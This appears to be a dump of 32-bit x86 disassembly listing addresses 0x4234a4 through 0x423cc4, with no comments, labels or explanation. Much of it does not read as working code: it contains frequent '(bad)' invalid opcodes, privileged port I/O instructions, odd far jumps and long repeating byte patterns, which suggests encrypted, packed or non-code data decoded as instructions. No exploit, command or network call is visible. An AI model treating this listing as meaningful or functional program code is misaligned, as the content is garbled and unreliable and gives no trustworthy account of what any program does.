  4234a4:	adc    eax,0x80f9f080
  4234a9:	xchg   edi,eax
  4234aa:	stc    
  4234ab:	push   ebx
  4234ac:	adc    DWORD PTR [ebx+0x7e],edx
  4234af:	mov    dl,0xbe
  4234b1:	or     al,0xb2
  4234b3:	clc    
  4234b4:	sub    edi,edi
  4234b6:	(bad)  
  4234b7:	in     al,dx
  4234b8:	mov    dl,0x80
  4234ba:	lock mov ah,BYTE PTR [ebx-0x4e]
  4234be:	in     al,0xb8
  4234c0:	xor    BYTE PTR [edi-0x76],0x50
  4234c4:	ja     0x42344a
  4234c6:	xor    BYTE PTR [edi+0x76],0x50
  4234ca:	ja     0x42352e
  4234cc:	ins    BYTE PTR es:[edi],dx
  4234cd:	mul    BYTE PTR [edi+ebp*2]
  4234d0:	cmp    BYTE PTR [eax-0x19],dl
  4234d3:	inc    esi
  4234d4:	jl     0x42354d
  4234d6:	xor    ch,0x24
  4234d9:	outs   dx,DWORD PTR ds:[esi]
  4234da:	cmp    BYTE PTR [eax-0xf7fb989],al
  4234e0:	inc    esi
  4234e1:	push   ebx
  4234e2:	je     0x423537
  4234e4:	push   ecx
  4234e5:	mov    dl,0x86
  4234e7:	or     al,0xb2
  4234e9:	mov    edx,0x50b2ff29
  4234ee:	ja     0x423546
  4234f0:	xor    BYTE PTR [edi+0x46],0x80
  4234f4:	lock inc esi
  4234f6:	push   ebx
  4234f7:	je     0x42354c
  4234f9:	push   ecx
  4234fa:	mov    dl,0x86
  4234fc:	or     al,0xb2
  4234fe:	mov    edx,0x50b2ff29
  423503:	ja     0x42357f
  423505:	jl     0x42357e
  423507:	ds dec ecx
  423509:	and    al,0x6f
  42350b:	cmp    BYTE PTR [edi+esi*2+0x1e],bh
  42350f:	fisub  WORD PTR [edi+ebp*2]
  423512:	cmp    BYTE PTR [eax-0xf7fb989],al
  423518:	inc    esi
  423519:	push   ebx
  42351a:	je     0x42356f
  42351c:	push   ecx
  42351d:	mov    dl,0xba
  42351f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423525:	xor    al,0x84
  423528:	arpl   bp,di
  42352a:	or     DWORD PTR [edi],ecx
  42352c:	pop    ss
  42352d:	in     al,dx
  42352e:	lea    ecx,[ebp-0x72f35f42]
  423534:	lea    eax,[eax+0x77803ef0]
  42353a:	adc    BYTE PTR ds:[edi+0x53fc5356],0x11
  423542:	mov    dl,0x84
  423544:	sub    DWORD PTR [edx-0x200f342],esi
  42354a:	xor    BYTE PTR [edi-0x7c],0x43
  42354e:	sti    
  42354f:	push   ebx
  423550:	jb     0x42359d
  423552:	add    eax,0x807a7750
  423557:	ja     0x423577
  423559:	xor    al,0x1e
  42355c:	push   ebx
  42355d:	je     0x4235b2
  42355f:	push   ecx
  423560:	mov    dl,0xba
  423562:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423568:	xor    al,0x7a
  42356b:	arpl   bp,di
  42356d:	fst    DWORD PTR [edi]
  42356f:	xor    BYTE PTR [edi+0x1e],0x80
  423573:	lock push ds
  423575:	push   ebx
  423576:	je     0x4235cb
  423578:	push   ecx
  423579:	mov    dl,0x86
  42357b:	or     al,0xb2
  42357d:	mov    edx,0x50b2ff29
  423582:	ja     0x4235fe
  423584:	xor    BYTE PTR [edi+0x3e],0x80
  423588:	lock ds push ebx
  42358b:	je     0x4235e0
  42358d:	push   ecx
  42358e:	mov    dl,0x86
  423590:	or     al,0xb2
  423592:	mov    edx,0x80b2ff29
  423597:	lock jp 0x4235a3
  42359a:	and    dh,BYTE PTR [edx-0x7f8588b0]
  4235a0:	ja     0x4235e8
  4235a2:	xor    al,0x46
  4235a5:	push   ebx
  4235a6:	je     0x4235fb
  4235a8:	push   ecx
  4235a9:	mov    dl,0xba
  4235ab:	sub    DWORD PTR [edx-0x4d00f37a],esi
  4235b1:	xor    al,0x7a
  4235b4:	arpl   bp,di
  4235b6:	or     DWORD PTR [edi],ecx
  4235b8:	(bad)  
  4235b9:	or     al,0x8d
  4235bb:	lea    eax,[eax+0x77507a77]
  4235c1:	scas   eax,DWORD PTR es:[edi]
  4235c2:	xor    BYTE PTR [edi+0x56],0xec
  4235c6:	ja     0x42362a
  4235c8:	push   eax
  4235c9:	out    0x7a,eax
  4235cb:	push   eax
  4235cc:	ja     0x423638
  4235ce:	pop    esi
  4235cf:	cmc    
  4235d0:	and    al,0x6f
  4235d2:	cmp    BYTE PTR [eax+0x77],dl
  4235d5:	pop    esi
  4235d6:	jl     0x42364f
  4235d8:	push   ss
  4235d9:	hlt    
  4235da:	and    al,0x6f
  4235dc:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  4235e0:	repz and al,0x6f
  4235e3:	cmp    BYTE PTR [eax+0x77],dl
  4235e6:	test   DWORD PTR [eax-0xf7f8589],0x5374537a
  4235f0:	push   ecx
  4235f1:	mov    dl,0x86
  4235f3:	or     al,0xb2
  4235f5:	mov    edx,0x50b2ff29
  4235fa:	ja     0x4235f9
  4235fc:	sub    BYTE PTR [edx-0x42],0x4f
  423600:	cmp    cl,BYTE PTR [ebp+0x7c6a808d]
  423606:	dec    edi
  423607:	or     cl,BYTE PTR [ebp+0x4d]
  42360a:	dec    ebp
  42360b:	jmp    0x7c6a:0x80386f24
  423612:	dec    edi
  423613:	xchg   ebp,eax
  423614:	dec    ebp
  423615:	dec    ebp
  423616:	dec    ebp
  423617:	or     esp,DWORD PTR [edi+ebp*2]
  42361a:	cmp    BYTE PTR [eax-0x7f957f96],al
  423620:	ja     0x423619
  423622:	xor    al,0xf7
  423625:	push   ebx
  423626:	je     0x42367b
  423628:	push   ecx
  423629:	mov    dl,0x86
  42362b:	or     al,0xb2
  42362d:	mov    edx,0x80b2ff29
  423632:	lock std 
  423634:	or     DWORD PTR [edx],esp
  423636:	mov    dl,0x80
  423638:	lock push 0xffffff8f
  42363b:	out    dx,al
  42363c:	out    dx,eax
  42363d:	adc    BYTE PTR [edi+0x4],dh
  423640:	sub    BYTE PTR [edx-0x80],0x77
  423644:	test   DWORD PTR [eax+0x5153f7f0],0xbab27453
  42364e:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423654:	xor    al,0xfd
  423657:	or     DWORD PTR [edx],esp
  423659:	mov    dl,0x80
  42365b:	lock push ss
  42365d:	adc    BYTE PTR [edi+0x53115316],0x7e
  423664:	mov    dl,0xbe
  423666:	or     al,0xb2
  423668:	clc    
  423669:	sub    edi,edi
  42366b:	(bad)  
  42366c:	in     al,dx
  42366d:	mov    dl,0x80
  42366f:	lock push 0x9
  423672:	loopne 0x423695
  423674:	out    dx,eax
  423675:	or     BYTE PTR [edi+0xa],0x4d
  423679:	dec    ebp
  42367a:	dec    ebp
  42367b:	sbb    BYTE PTR [eax],0xa
  42367e:	dec    ebp
  42367f:	dec    ebp
  423680:	dec    ebp
  423681:	push   ebx
  423682:	je     0x4236d7
  423684:	jle    0x423638
  423686:	xchg   BYTE PTR [edx+esi*4],cl
  423689:	clc    
  42368a:	sub    edi,edi
  42368c:	sti    
  42368d:	in     al,dx
  42368e:	mov    dl,0x9
  423690:	loopne 0x423682
  423692:	add    al,0x53
  423694:	std    
  423695:	adc    al,dh
  423697:	add    al,0x80
  423699:	push   0xffffff8f
  42369b:	ja     0x4236a1
  42369d:	xor    al,0xf7
  4236a0:	adc    BYTE PTR [edi+0x531153f7],0x7e
  4236a7:	mov    dl,0xf8
  4236a9:	sub    DWORD PTR [edx-0x100f342],esi
  4236af:	adc    BYTE PTR [edi-0x1ddf603],0x80
  4236b6:	xchg   edi,eax
  4236b7:	push   0x10
  4236b9:	out    dx,al
  4236ba:	push   cs
  4236bb:	sub    BYTE PTR [edx-0x80],0x77
  4236bf:	test   DWORD PTR [eax+0x7453f7f0],0x86b25153
  4236c9:	or     al,0xb2
  4236cb:	mov    edx,0x80b2ff29
  4236d0:	lock std 
  4236d2:	or     DWORD PTR [edx],esp
  4236d4:	mov    dl,0x80
  4236d6:	lock push 0xffffff8f
  4236d9:	out    dx,al
  4236da:	out    dx,eax
  4236db:	adc    BYTE PTR [edi+0x4],dh
  4236de:	sub    BYTE PTR [edx-0x80],0x77
  4236e2:	test   DWORD PTR [eax+0x7453f7f0],0x530c86b2
  4236ec:	push   ecx
  4236ed:	mov    dl,0xba
  4236ef:	sub    edi,edi
  4236f1:	mov    dl,0x80
  4236f3:	lock std 
  4236f5:	or     DWORD PTR [edx],esp
  4236f7:	mov    dl,0x80
  4236f9:	lock pop esi
  4236fb:	adc    BYTE PTR [edi+0x5311535e],0x7e
  423702:	mov    dl,0xbe
  423704:	or     al,0xb2
  423706:	clc    
  423707:	sub    edi,edi
  423709:	(bad)  
  42370a:	in     al,dx
  42370b:	mov    dl,0x80
  42370d:	lock push 0x9
  423710:	loopne 0x423733
  423712:	out    dx,eax
  423713:	or     BYTE PTR [edi-0x6b],0x4d
  423717:	dec    ebp
  423718:	dec    ebp
  423719:	sbb    BYTE PTR [eax],0x95
  42371c:	dec    ebp
  42371d:	dec    ebp
  42371e:	dec    ebp
  42371f:	push   ebx
  423720:	je     0x423775
  423722:	jle    0x4236d6
  423724:	xchg   BYTE PTR [edx+esi*4],cl
  423727:	clc    
  423728:	sub    edi,edi
  42372a:	sti    
  42372b:	in     al,dx
  42372c:	mov    dl,0x9
  42372e:	loopne 0x423720
  423730:	add    al,0x53
  423732:	std    
  423733:	adc    al,dh
  423735:	add    al,0x80
  423737:	push   0xffffff8f
  423739:	ja     0x42373f
  42373b:	xor    al,0xf7
  42373e:	adc    BYTE PTR [edi+0x531153f7],0x7e
  423745:	mov    dl,0xf8
  423747:	sub    DWORD PTR [edx-0x100f342],esi
  42374d:	adc    BYTE PTR [edi-0x1ddf603],0x80
  423754:	xchg   edi,eax
  423755:	push   0x10
  423757:	out    dx,al
  423758:	push   cs
  423759:	sub    BYTE PTR [edx-0x80],0x77
  42375d:	ss xor al,0x36
  423761:	push   ebx
  423762:	push   ecx
  423763:	push   ebx
  423764:	je     0x423718
  423766:	mov    edx,0xc86b229
  42376b:	push   DWORD PTR [edx-0x7fa10f80]
  423771:	xchg   edi,eax
  423772:	pop    esi
  423773:	push   ebx
  423774:	adc    DWORD PTR [ebx+0x7e],edx
  423777:	mov    dl,0xbe
  423779:	or     al,0xb2
  42377b:	clc    
  42377c:	sub    edi,edi
  42377e:	dec    BYTE PTR [ecx]
  423780:	and    dh,BYTE PTR [edx+0x50fd77ec]
  423786:	ja     0x423785
  423788:	xor    BYTE PTR [edi-0x3],0x80
  42378c:	lock scas eax,DWORD PTR es:[edi]
  42378e:	arpl   bp,di
  423790:	or     edx,ebp
  423792:	(bad)  
  423793:	or     eax,0x77804d4d
  423798:	pop    esi
  423799:	xor    al,0x5e
  42379c:	push   ebx
  42379d:	push   ecx
  42379e:	mov    dl,0xba
  4237a0:	sub    DWORD PTR [ebx+0x74],edx
  4237a3:	mov    dl,0x86
  4237a5:	or     al,0xff
  4237a7:	mov    dl,0x80
  4237a9:	lock scas eax,DWORD PTR es:[edi]
  4237ab:	or     DWORD PTR [edx],esp
  4237ad:	mov    dl,0x80
  4237af:	lock jp 0x423805
  4237b2:	adc    DWORD PTR [edx-0x4d00f342],esi
  4237b8:	xor    al,0x7a
  4237bb:	push   ebx
  4237bc:	push   ecx
  4237bd:	mov    dl,0xba
  4237bf:	sub    edi,edi
  4237c1:	mov    dl,0x50
  4237c3:	ja     0x4237fb
  4237c5:	xor    BYTE PTR [edi-0x7e],0x80
  4237c9:	lock adc BYTE PTR [ebx+0x51],0xb2
  4237ce:	mov    edx,0xb2745329
  4237d3:	xchg   BYTE PTR [edi+edi*8],cl
  4237d6:	mov    dl,0x80
  4237d8:	lock add BYTE PTR [eax+0x11538297],0xb2
  4237e0:	mov    esi,0xb27e530c
  4237e5:	clc    
  4237e6:	sub    edi,edi
  4237e8:	(bad)  
  4237e9:	in     al,dx
  4237ea:	lock ss in al,dx
  4237ed:	std    
  4237ee:	in     al,dx
  4237ef:	lock push esi
  4237f1:	push   eax
  4237f2:	lock push esi
  4237f4:	les    ebx,FWORD PTR ds:0x80827780
  4237fa:	lock adc BYTE PTR [ebx+0x74],0x53
  4237ff:	push   ecx
  423800:	mov    dl,0x86
  423802:	or     al,0xb2
  423804:	mov    edx,0xecb2ff29
  423809:	ja     0x423861
  42380b:	push   eax
  42380c:	ja     0x423864
  42380e:	xor    BYTE PTR [edi-0x7e],0x80
  423812:	lock adc BYTE PTR [ebx+0x74],0xb2
  423817:	xchg   BYTE PTR [ebx+edx*2],cl
  42381a:	push   ecx
  42381b:	mov    dl,0xba
  42381d:	sub    edi,edi
  42381f:	mov    dl,0x80
  423821:	lock test BYTE PTR [ebx-0x3],al
  423825:	xor    BYTE PTR [edi-0x7e],0x80
  423829:	xchg   edi,eax
  42382a:	adc    BYTE PTR [ebx+0x74],0x53
  42382e:	jle    0x4237e2
  423830:	clc    
  423831:	sub    DWORD PTR [edx-0x400f37a],esi
  423837:	adc    BYTE PTR [edi-0x4ddf6aa],0x63
  42383e:	mov    dl,0x9
  423840:	dec    esp
  423841:	xor    cl,BYTE PTR [edx+0x77804d4d]
  423847:	mov    eax,DWORD PTR [eax+0x77808b77]
  42384d:	mov    dl,BYTE PTR [eax+0x77]
  423850:	xor    BYTE PTR ss:[edi-0x11],0x80
  423855:	lock adc BYTE PTR es:[edi-0x4deeacda],0xbe
  42385e:	or     al,0x53
  423860:	jle    0x4237e2
  423862:	int    0x32
  423864:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  42386a:	(bad)  
  42386b:	(bad)  
  42386c:	xchg   esi,eax
  42386d:	xor    al,0x66
  423870:	adc    BYTE PTR [edi+0x53115366],0x7e
  423877:	mov    dl,0xbe
  423879:	or     al,0xb2
  42387b:	clc    
  42387c:	sub    edi,edi
  42387e:	(bad)  
  42387f:	xchg   esi,eax
  423880:	xor    al,0x8b
  423883:	adc    BYTE PTR [edi+0x36d74d8b],0x53
  42388a:	adc    DWORD PTR [ebx+0x7e],edx
  42388d:	mov    dl,0xbe
  42388f:	or     al,0xb2
  423891:	clc    
  423892:	sub    edi,edi
  423894:	(bad)  
  423895:	xchg   esi,eax
  423896:	dec    ebp
  423897:	or     dl,BYTE PTR ds:0x808bf080
  42389d:	xchg   edi,eax
  42389e:	mov    edx,DWORD PTR [ebx+0x11]
  4238a1:	push   ebx
  4238a2:	jle    0x423856
  4238a4:	mov    esi,0x29f8b20c
  4238a9:	(bad)  
  4238aa:	(bad)  
  4238ab:	push   eax
  4238ac:	ja     0x423914
  4238ae:	arpl   bp,di
  4238b0:	or     DWORD PTR [edi],ecx
  4238b2:	cmp    al,0x8d
  4238b4:	lea    ecx,[ebp-0x3b748880]
  4238ba:	lock adc BYTE PTR [edi-0x7b88af9a],0x6e
  4238c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238c3:	test   BYTE PTR [eax-0x414d7b10],al
  4238c9:	or     al,0x53
  4238cb:	cld    
  4238cc:	mov    dl,0x84
  4238ce:	sub    edi,edi
  4238d0:	mov    dl,0x80
  4238d2:	lock jbe 0x423864
  4238d5:	and    DWORD PTR [edx],edi
  4238d7:	adc    BYTE PTR [ecx],ah
  4238d9:	jno    0x42385b
  4238db:	lock stc 
  4238dd:	xor    al,0xf9
  4238e0:	adc    BYTE PTR [edi+0x531153f9],0x7e
  4238e7:	mov    dl,0xf8
  4238e9:	sub    DWORD PTR [edx-0x100f342],esi
  4238ef:	adc    BYTE PTR [edi-0x7f021307],0x77
  4238f6:	test   BYTE PTR [ebx-0x6c],dl
  4238f9:	in     eax,dx
  4238fa:	test   BYTE PTR [edx-0x4d750713],cl
  423900:	mov    esi,0xfffbec29
  423905:	mov    dl,0x53
  423907:	jl     0x423889
  423909:	lock mov al,BYTE PTR [eax-0x74d7569]
  423910:	or     al,0xb2
  423912:	mov    esi,0x53b6ff29
  423917:	pushf  
  423918:	arpl   bx,di
  42391a:	xlat   BYTE PTR ds:[ebx]
  42391b:	sub    al,0x80
  42391d:	ja     0x42390e
  42391f:	xor    al,0x2e
  423922:	adc    BYTE PTR [edi+0x32cd802e],0x3a
  423929:	lea    ecx,[ebp+0x7e531153]
  42392f:	mov    dl,0xbe
  423931:	or     al,0xb2
  423933:	clc    
  423934:	sub    edi,edi
  423936:	(bad)  
  423937:	xchg   esi,eax
  423938:	xor    al,0x8b
  42393b:	adc    BYTE PTR [edi+0x5311538b],0x7e
  423942:	mov    dl,0xbe
  423944:	or     al,0xb2
  423946:	clc    
  423947:	sub    edi,edi
  423949:	(bad)  
  42394a:	xchg   esi,eax
  42394b:	dec    ebp
  42394c:	xlat   BYTE PTR ds:[ebx]
  42394d:	jbe    0x42399c
  42394f:	or     bl,BYTE PTR ds:0x50667780
  423955:	ja     0x4239cd
  423957:	xor    BYTE PTR [edi+0x36],0x50
  42395b:	ja     0x4238e7
  42395d:	xor    BYTE PTR [edi-0x76],0x53
  423961:	jo     0x423950
  423963:	xchg   dh,ch
  423965:	aad    0x43
  423967:	xor    BYTE PTR [edi+0x76],0x80
  42396b:	adc    eax,0x767780ef
  423970:	sub    dh,0xef
  423973:	push   ebx
  423974:	cld    
  423975:	push   ebx
  423976:	xchg   esp,eax
  423977:	mov    dl,0x84
  423979:	sub    DWORD PTR [edx-0x400f3f9],esi
  42397f:	adc    BYTE PTR [edi-0x5911af8a],0x80
  423986:	ja     0x423912
  423988:	in     eax,dx
  423989:	mov    dl,0xee
  42398b:	in     eax,dx
  42398c:	xchg   dh,ch
  42398e:	arpl   bp,di
  423990:	in     al,0x98
  423992:	xor    BYTE PTR [edi-0x76],0x53
  423996:	jo     0x423985
  423998:	xchg   dh,ch
  42399a:	aad    0x43
  42399c:	xor    BYTE PTR [edi+0x76],0x80
  4239a0:	adc    eax,0x767780ef
  4239a5:	sub    dh,0xef
  4239a8:	push   ebx
  4239a9:	cld    
  4239aa:	push   ebx
  4239ab:	xchg   esp,eax
  4239ac:	mov    dl,0x84
  4239ae:	sub    DWORD PTR [edx-0x400f3f9],esi
  4239b4:	adc    BYTE PTR [edi-0x5911af8a],0x80
  4239bb:	ja     0x423947
  4239bd:	in     eax,dx
  4239be:	mov    dl,0xee
  4239c0:	in     eax,dx
  4239c1:	xchg   dh,ch
  4239c3:	arpl   bp,di
  4239c5:	in     al,0x98
  4239c7:	xor    BYTE PTR [edi+0x76],0x80
  4239cb:	lock stc 
  4239cd:	push   eax
  4239ce:	ja     0x42397f
  4239d0:	xor    BYTE PTR [edi-0x7],0x53
  4239d4:	adc    DWORD PTR [ebx-0x4],edx
  4239d7:	mov    dl,0x84
  4239d9:	sub    DWORD PTR [edx-0x200f342],esi
  4239df:	xor    BYTE PTR [edi-0x75],0x50
  4239e3:	lock es jl 0x423a5e
  4239e7:	inc    ecx
  4239e8:	ins    DWORD PTR es:[edi],dx
  4239e9:	pop    ebp
  4239ea:	ins    DWORD PTR es:[edi],dx
  4239eb:	aas    
  4239ec:	jl     0x423a65
  4239ee:	pop    edx
  4239ef:	ins    DWORD PTR es:[edi],dx
  4239f0:	inc    ebx
  4239f1:	ins    DWORD PTR es:[edi],dx
  4239f2:	push   ebx
  4239f3:	push   eax
  4239f4:	ja     0x423a5c
  4239f6:	fsub   QWORD PTR [si]
  4239f9:	outs   dx,DWORD PTR ds:[esi]
  4239fa:	cmp    BYTE PTR [ecx],cl
  4239fc:	jg     0x80cfc78f
  423a02:	xchg   edi,eax
  423a03:	scas   eax,DWORD PTR es:[edi]
  423a04:	cmp    ch,0x53
  423a07:	adc    DWORD PTR [eax-0x10],edx
  423a0a:	test   BYTE PTR [edx+0x530c84c7],dh
  423a10:	cld    
  423a11:	mov    dl,0x84
  423a13:	sub    edi,edi
  423a15:	ja     0x42399b
  423a17:	push   eax
  423a18:	lock bound ecx,QWORD PTR [edi+0x9412f31]
  423a1f:	cli    
  423a20:	out    dx,al
  423a21:	jno    0x4239f0
  423a23:	add    eax,0xbdbecdcd
  423a28:	or     eax,esp
  423a2a:	jo     0x423a8f
  423a2c:	mov    dl,0xd7
  423a2e:	fiadd  DWORD PTR [eax-0xf7f0689]
  423a34:	stc    
  423a35:	xor    BYTE PTR [edi-0x7],0x80
  423a39:	xchg   edi,eax
  423a3a:	stc    
  423a3b:	push   ebx
  423a3c:	cld    
  423a3d:	push   ebx
  423a3e:	adc    DWORD PTR [edx-0x414dd67c],esi
  423a44:	or     al,0xff
  423a46:	std    
  423a47:	xor    BYTE PTR [edi+0x66],0x53
  423a4b:	cld    
  423a4c:	mov    dl,0x84
  423a4e:	sub    edi,edi
  423a50:	ja     0x4239d6
  423a52:	push   ebx
  423a53:	xchg   esp,eax
  423a54:	in     al,dx
  423a55:	std    
  423a56:	xor    BYTE PTR [edi+0x62],0xed
  423a5a:	test   BYTE PTR [edx-0x4d750713],cl
  423a60:	mov    esi,0xfff7ec29
  423a65:	(bad)  
  423a66:	push   ebx
  423a67:	sub    al,BYTE PTR [eax+0x66f050b2]
  423a6d:	fsub   QWORD PTR [si]
  423a70:	outs   dx,DWORD PTR ds:[esi]
  423a71:	cmp    bh,dl
  423a73:	add    DWORD PTR [eax-0x6f3bd910],eax
  423a79:	xor    al,0x8b
  423a7c:	xor    BYTE PTR [edi-0x75],0x53
  423a80:	adc    DWORD PTR [ebx-0x4],edx
  423a83:	mov    dl,0xbe
  423a85:	or     al,0xb2
  423a87:	test   BYTE PTR [ecx],ch
  423a89:	(bad)  
  423a8a:	std    
  423a8b:	xor    BYTE PTR [edi-0x75],0x80
  423a8f:	xchg   edi,eax
  423a90:	mov    edx,DWORD PTR [ebx+0x74]
  423a93:	push   ebx
  423a94:	jle    0x423a48
  423a96:	xchg   BYTE PTR [edx+esi*4],cl
  423a99:	clc    
  423a9a:	sub    edi,edi
  423a9c:	sti    
  423a9d:	arpl   WORD PTR [edx+0xc230f09],si
  423aa3:	lea    ecx,[ebp-0x7f508880]
  423aa9:	ins    DWORD PTR es:[edi],dx
  423aaa:	out    dx,eax
  423aab:	push   eax
  423aac:	out    0xf9,eax
  423aae:	jl     0x423b27
  423ab0:	es repz and al,0x6f
  423ab4:	cmp    BYTE PTR [edi+esi*2+0x36],bh
  423ab8:	hlt    
  423ab9:	and    al,0x6f
  423abb:	cmp    BYTE PTR [edi+esi*2+0x7a],bh
  423abf:	mul    BYTE PTR [ebx+0x777c386f]
  423ac5:	test   dl,bh
  423ac7:	and    al,0x6f
  423ac9:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423acd:	nop
  423ace:	shr    BYTE PTR [edi+0x38],1
  423ad1:	push   eax
  423ad2:	ja     0x423b12
  423ad4:	xor    BYTE PTR [edi-0x11],0x80
  423ad8:	lock test BYTE PTR [eax+0x11538497],al
  423adf:	mov    dl,0xbe
  423ae1:	or     al,0x53
  423ae3:	jle    0x423a97
  423ae5:	clc    
  423ae6:	sub    edi,edi
  423ae8:	(bad)  
  423ae9:	xchg   esi,eax
  423aea:	xor    al,0x7a
  423aed:	adc    BYTE PTR [edi-0x4deeac86],0xbe
  423af4:	or     al,0x53
  423af6:	jle    0x423a78
  423af8:	int    0x32
  423afa:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b00:	(bad)  
  423b01:	(bad)  
  423b02:	xchg   esi,eax
  423b03:	xor    al,0x66
  423b06:	adc    BYTE PTR [edi+0x53115366],0x7e
  423b0d:	mov    dl,0xbe
  423b0f:	or     al,0xb2
  423b11:	clc    
  423b12:	sub    edi,edi
  423b14:	(bad)  
  423b15:	xchg   esi,eax
  423b16:	xor    al,0xf9
  423b19:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423b20:	mov    dl,0xbe
  423b22:	or     al,0xb2
  423b24:	clc    
  423b25:	sub    edi,edi
  423b27:	(bad)  
  423b28:	xchg   esi,eax
  423b29:	dec    ebp
  423b2a:	or     dl,BYTE PTR ds:0x80667750
  423b30:	ja     0x423b21
  423b32:	xor    al,0x84
  423b35:	adc    BYTE PTR [edi-0x4deeac7c],0xbe
  423b3c:	or     al,0x53
  423b3e:	jle    0x423ac0
  423b40:	int    0x32
  423b42:	cmp    cl,BYTE PTR [ebp+0x29f8b28d]
  423b48:	(bad)  
  423b49:	(bad)  
  423b4a:	xchg   esi,eax
  423b4b:	xor    al,0x7a
  423b4e:	adc    BYTE PTR [edi+0x5311537a],0x7e
  423b55:	mov    dl,0xbe
  423b57:	or     al,0xb2
  423b59:	clc    
  423b5a:	sub    edi,edi
  423b5c:	(bad)  
  423b5d:	xchg   esi,eax
  423b5e:	xor    al,0xf9
  423b61:	adc    BYTE PTR [edi+0x3ed74df9],0x53
  423b68:	adc    DWORD PTR [ebx+0x7e],edx
  423b6b:	mov    dl,0xbe
  423b6d:	or     al,0xb2
  423b6f:	clc    
  423b70:	sub    edi,edi
  423b72:	(bad)  
  423b73:	xchg   esi,eax
  423b74:	dec    ebp
  423b75:	or     dl,BYTE PTR ds:0x50f9f080
  423b7b:	ja     0x423b01
  423b7d:	xor    BYTE PTR [edi-0x7],0x53
  423b81:	adc    DWORD PTR [ebx-0x4],edx
  423b84:	mov    dl,0xbe
  423b86:	or     al,0xb2
  423b88:	test   BYTE PTR [ecx],ch
  423b8a:	(bad)  
  423b8b:	std    
  423b8c:	xor    BYTE PTR [edi+0x66],0x63
  423b90:	std    
  423b91:	or     DWORD PTR [edi],ecx
  423b93:	cmp    eax,0x808d8d2f
  423b98:	lock stc 
  423b9a:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423ba1:	mov    dl,0xbe
  423ba3:	or     al,0xb2
  423ba5:	clc    
  423ba6:	sub    edi,edi
  423ba8:	(bad)  
  423ba9:	arpl   ax,si
  423bab:	test   BYTE PTR [ecx],cl
  423bad:	bswap  edi
  423baf:	das    
  423bb0:	lea    ecx,[ebp-0x7fd90f80]
  423bb6:	lock es mov dl,0xbe
  423bba:	or     al,0xcd
  423bbc:	add    eax,0x80ef10c4
  423bc1:	lock stc 
  423bc3:	xor    al,0xf9
  423bc6:	mov    dl,0xbe
  423bc8:	or     al,0xcd
  423bca:	add    eax,0x3a7d10c4
  423bcf:	xor    al,0x36
  423bd2:	xor    al,0x36
  423bd5:	mov    dl,0xbe
  423bd7:	or     al,0xcd
  423bd9:	add    eax,0xc7d10c4
  423bde:	in     eax,dx
  423bdf:	cmp    BYTE PTR ds:0x8d4d4d4d,bl
  423be5:	in     eax,dx
  423be6:	cmp    BYTE PTR ds:0x8d4d4d4d,ah
  423bec:	add    DWORD PTR [ecx],eax
  423bee:	and    eax,0x964d4d4d
  423bf3:	dec    ebp
  423bf4:	xlat   BYTE PTR ds:[ebx]
  423bf5:	add    DWORD PTR ds:[ecx],eax
  423bf8:	sbb    eax,0x4d4d4d4d
  423bfd:	xlat   BYTE PTR ds:[ebx]
  423bfe:	test   BYTE PTR [esi+0x4daff080],dl
  423c04:	sahf   
  423c05:	and    DWORD PTR [eax-0x4d128910],eax
  423c0b:	jno    0x423ba3
  423c0d:	or     al,BYTE PTR [esi+0x4d4d8832]
  423c13:	push   eax
  423c14:	ja     0x423c78
  423c16:	xor    BYTE PTR [edi-0x11],0x80
  423c1a:	lock adc BYTE PTR cs:[edi+0x32cd802e],0x3a
  423c23:	lea    ecx,[ebp+0x7e531153]
  423c29:	mov    dl,0xbe
  423c2b:	or     al,0xb2
  423c2d:	clc    
  423c2e:	sub    edi,edi
  423c30:	(bad)  
  423c31:	xchg   esi,eax
  423c32:	xor    al,0xf9
  423c35:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c3c:	mov    dl,0xbe
  423c3e:	or     al,0xb2
  423c40:	clc    
  423c41:	sub    edi,edi
  423c43:	(bad)  
  423c44:	xchg   esi,eax
  423c45:	dec    ebp
  423c46:	xlat   BYTE PTR ds:[ebx]
  423c47:	dec    bp
  423c49:	or     bl,BYTE PTR ds:0xb2627780
  423c4f:	push   0xc
  423c51:	push   ebx
  423c52:	jl     0x423cb7
  423c54:	jl     0x423bd6
  423c56:	ja     0x423c47
  423c58:	xor    al,0x2e
  423c5b:	or     ch,0x32
  423c5e:	cmp    cl,BYTE PTR [ebp+0x2e97808d]
  423c64:	xlat   BYTE PTR ds:[ebx]
  423c65:	push   ebp
  423c66:	push   ebx
  423c67:	adc    DWORD PTR [ebx+0x7e],edx
  423c6a:	mov    dl,0xbe
  423c6c:	or     al,0xb2
  423c6e:	clc    
  423c6f:	sub    edi,edi
  423c71:	(bad)  
  423c72:	xchg   esi,eax
  423c73:	xor    al,0xf9
  423c76:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423c7d:	mov    dl,0xbe
  423c7f:	or     al,0xb2
  423c81:	clc    
  423c82:	sub    edi,edi
  423c84:	(bad)  
  423c85:	xchg   esi,eax
  423c86:	dec    ebp
  423c87:	xlat   BYTE PTR ds:[ebx]
  423c88:	jbe    0x423cd7
  423c8a:	or     bl,BYTE PTR ds:0x50847780
  423c90:	ja     0x423d08
  423c92:	xor    BYTE PTR [edi+0x3e],0x50
  423c96:	ja     0x423c22
  423c98:	les    edi,FWORD PTR [ecx]
  423c9a:	push   ebx
  423c9b:	adc    DWORD PTR [ebx+0x7e],edx
  423c9e:	mov    dl,0xbe
  423ca0:	or     al,0xb2
  423ca2:	clc    
  423ca3:	sub    edi,edi
  423ca5:	(bad)  
  423ca6:	xchg   esi,eax
  423ca7:	xor    al,0xf9
  423caa:	adc    BYTE PTR [edi+0x531153f9],0x7e
  423cb1:	mov    dl,0xbe
  423cb3:	or     al,0xb2
  423cb5:	clc    
  423cb6:	sub    edi,edi
  423cb8:	(bad)  
  423cb9:	xchg   esi,eax
  423cba:	dec    ebp
  423cbb:	xlat   BYTE PTR ds:[ebx]
  423cbc:	test   BYTE PTR [ebp+0xa],cl
  423cbf:	sbb    eax,0x508a7780
  423cc4:	ja     0x423ce4
